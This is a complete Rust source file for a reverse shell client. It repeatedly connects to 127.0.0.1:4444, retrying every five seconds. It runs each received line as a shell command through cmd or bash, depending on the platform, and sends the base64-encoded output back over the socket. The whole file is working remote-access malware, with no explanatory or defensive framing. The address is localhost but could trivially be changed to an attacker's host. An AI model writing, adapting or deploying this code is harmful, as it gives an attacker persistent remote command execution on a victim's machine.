use std::{
    io::{BufRead, BufReader, Write},
    net::TcpStream,
    process::Command,
    thread,
    time::{Duration},
};

#[cfg(target_os = "windows")]
const SHELL: [&str; 2] = ["cmd", "/c"];
#[cfg(not(target_os = "windows"))]
const SHELL: [&str; 2] = ["bash", "-c"];

fn main() {
    loop {
        match TcpStream::connect("127.0.0.1:4444") {
            Err(_) => {
                thread::sleep(Duration::from_millis(5000));
                continue;
            }
            Ok(mut stream) => loop {
                let mut packet = BufReader::new(&mut stream);
                let mut input = vec![];

                match packet.read_until(10, &mut input) {
                    Ok(bytes) => {
                        if bytes == 0 {
                            break;
                        } else {
                            let cmd = String::from_utf8_lossy(&input[0..input.len() - 1]);

                            let _ = match Command::new(SHELL[0]).args(&[SHELL[1], &cmd]).output() {
                                Ok(output) => {
                                    let _ = stream.write_all((base64::encode(output.stdout)+"\n").as_bytes());
                                    stream.write_all((base64::encode(output.stderr)+"\n").as_bytes())
                                },
                                Err(error) => {
                                    stream.write_all((error.to_string() + "\n").as_bytes())
                                }
                            };
                        }
                    }
                    Err(_) => {
                        break;
                    }
                }
            },
        }
    }
}
